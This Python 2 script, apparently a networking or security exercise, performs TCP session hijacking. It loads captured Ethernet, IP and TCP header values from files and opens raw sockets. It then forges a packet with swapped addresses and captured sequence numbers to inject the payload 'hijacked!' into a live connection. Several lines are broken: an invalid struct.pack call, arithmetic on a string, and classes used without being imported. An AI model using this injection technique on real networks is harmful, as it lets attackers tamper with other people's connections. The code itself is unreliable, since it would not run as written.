import os
import sys
import socket
import struct
import create_tcp_packet
import create_ip_packet

eth=[] 
ip=[]
tcp=[]

with open("packet_eth.txt", "r") as fileHandler:  
    # Read next line
    line = fileHandler.readline()
    # check line is not empty
    while line:
        #print(line.strip().split(":",1)[1])
	eth+= [line.strip().split(":",1)[1]]
        line = fileHandler.readline()

print "\n"
with open("packet_ip.txt", "r") as fileHandler:  
    # Read next line
    line = fileHandler.readline()
    # check line is not empty
    while line:
        #print(line.strip().split(":",1)[1])
	ip+= [line.strip().split(":",1)[1]]
        line = fileHandler.readline()

print "\n"
with open("packet_tcp.txt", "r") as fileHandler:  
    # Read next line
    line = fileHandler.readline()
    # check line is not empty
    while line:
        #print(line.strip().split(":",1)[1])
	tcp+= [line.strip().split(":",1)[1]]
        line = fileHandler.readline()

#print "\n\nIn loop eth\n"
#for x in range(len(eth)):
	#print eth[x],

#print "\nIn loop ip\n"
#for x in range(len(ip)):
	#print ip[x],

#print "\nIn loop eth\n"
#for x in range(len(tcp)):
	#print tcp[x],

protocolmac=eth[0]
smac=eth[1]
dmac=eth[2]

protocolip=ip[0]
length=ip[1]
version=ip[2]
idnt=ip[3]
ttl=ip[4]
fragment=ip[5]
tos=ip[6]
chkSumip=ip[7]
source_ip=ip[8]
destn_ip=ip[9]

window=tcp[0]
sport=tcp[1]
offres=tcp[2]
flag=tcp[3]
chkSumtcp=tcp[4]
dport=tcp[5]
urg_pnt=tcp[6]
seq=tcp[7]
ack=tcp[8]

skt=socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
skt2=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

dataLen=length-52
data="hijacked!"

server_ip=sys.argv[1]
client_ip=sys.argv[2]

ip_header=IPPacket(source_ip,destn_ip)
ip_header.assemble_ipv4_fields()
tcp_header=TCPPacket(dport,sport,destn_ip,source_ip,data,seq,ack)
tcp_header.assemble_tcp_fields()

skt2.sendto(ip_header+tcp_header+struct.pack(!9s,data),(destn_ip,dport))

#print "\n{},	{},	{}\n".format(protocolmac,smac,dmac)
